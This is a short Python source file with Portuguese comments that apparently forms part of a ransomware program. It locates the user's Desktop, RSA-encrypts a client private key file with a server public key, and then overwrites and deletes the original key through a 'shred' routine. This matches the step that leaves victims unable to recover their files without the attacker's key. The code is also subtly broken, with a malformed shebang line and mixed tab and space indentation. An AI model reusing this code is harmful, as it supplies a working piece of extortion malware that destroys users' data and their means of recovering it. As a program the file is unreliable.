#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
from Crypto.PublicKey import RSA
import os
import string
import random

def generate_data(length):
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

# destroi o arquivo original e depois exclui, não podendo recupera-lo com buscas na memória
def shred(file_name,  passes):
    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)


    # CODIGO PARA CRIPTOGRAFAR A CHAVE PRIVADA DO CLIENTE COM A CHAVE PUBLICA DO SERVIDOR
def RSA_to_SRSA():
    caminho = os.environ['HOME']+'/Desktop/'
    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
    if(os.path.isdir(caminho)):
        caminho_correto = caminho
    elif(os.path.isdir(caminho2)):
        caminho_correto = caminho2

	readsize = 127
	writesize = 128
	f = open(caminho_correto + 'chave_privada_cliente.txt','rb')
	p = open(caminho_correto + 'chave_privada_cliente.txt.enc','wb')
	g = open(caminho_correto + 'CHAVE_PUBLICA_SERVIDOR.txt','rb')
	chave_publica = g.read()
	chave_publica_objeto = RSA.importKey(chave_publica)

	while True:
		data = f.read(readsize)
		if not data:
			break
		enc_data = chave_publica_objeto.encrypt(data, 32)[0]

		p.write(chr(len(enc_data)))
		p.write(enc_data)
	p.close()
	f.close()
	g.close()
	shred(caminho_correto + 'chave_privada_cliente.txt',1)
